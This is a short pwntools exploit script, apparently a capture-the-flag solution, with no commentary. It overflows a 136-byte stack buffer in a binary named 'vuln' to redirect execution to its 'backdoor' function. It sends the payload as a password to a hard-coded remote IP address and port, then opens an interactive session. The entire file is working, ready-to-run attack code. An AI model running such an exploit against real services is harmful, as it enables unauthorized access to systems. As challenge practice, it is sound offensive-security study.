#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

elf = ELF('./vuln', checksec=False)

rip_off = 0x80 + 8               # 136
win     = elf.sym['backdoor'] + 5 # 0x4011fb

payload = flat({rip_off: p64(win)}, filler=b'\x00')

p = remote('120.27.146.76', 20959, timeout=8)
p.sendafter(b'Username: ', b'x\n')
p.sendafter(b'Password: ', payload + b'\n')

p.interactive()
p.close()
